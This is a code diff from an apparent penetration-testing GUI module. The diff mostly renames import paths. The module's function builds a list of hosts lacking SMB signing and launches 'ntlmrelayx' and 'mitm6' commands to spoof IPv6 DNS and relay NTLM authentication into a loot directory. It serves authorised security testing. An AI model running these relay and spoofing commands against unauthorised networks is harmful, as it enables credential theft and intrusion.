@@ -1,16 +1,16 @@
-import pollenisatorgui.core.Components.Utils as Utils
-from pollenisatorgui.core.Application.Dialogs.ChildDialogQuestion import ChildDialogQuestion
-from pollenisatorgui.core.Application.Dialogs.ChildDialogCombo import ChildDialogCombo
-from pollenisatorgui.core.Application.Dialogs.ChildDialogAskText import ChildDialogAskText
+import pollenisatorgui.core.components.utils as utils
+from pollenisatorgui.core.application.dialogs.ChildDialogQuestion import ChildDialogQuestion
+from pollenisatorgui.core.application.dialogs.ChildDialogCombo import ChildDialogCombo
+from pollenisatorgui.core.application.dialogs.ChildDialogAskText import ChildDialogAskText
 import os
-from pollenisatorgui.core.Components.apiclient import APIClient
+from pollenisatorgui.core.components.apiclient import APIClient
 import psutil
 
 
 def main(apiclient):
     APIClient.setInstance(apiclient)
     smb_signing_list = apiclient.find("ActiveDirectory", {"infos.signing":"False"}, True)
-    export_dir = Utils.getExportDir()
+    export_dir = utils.getExportDir()
     file_name = os.path.join(export_dir, "relay_list.lst")
     domains = set()
     liste = []
@@ -55,8 +55,8 @@ def main(apiclient):
 
     address = addrs[device][0].address
     cmd = f"sudo ntlmrelayx -tf {file_name} -6 -wh {address} -of {relaying_loot_path}/"
-    Utils.executeInExternalTerm(f"'{cmd}'")
+    utils.executeInExternalTerm(f"'{cmd}'")
     cmd = f"sudo mitm6 -i {device} -d {domain}"
-    Utils.executeInExternalTerm(f"'{cmd}'")
+    utils.executeInExternalTerm(f"'{cmd}'")
     return True, f"Listening ntlmrelayx with mittm6 opened, loot directory is here:"+str(relaying_loot_path)+"\n"
     
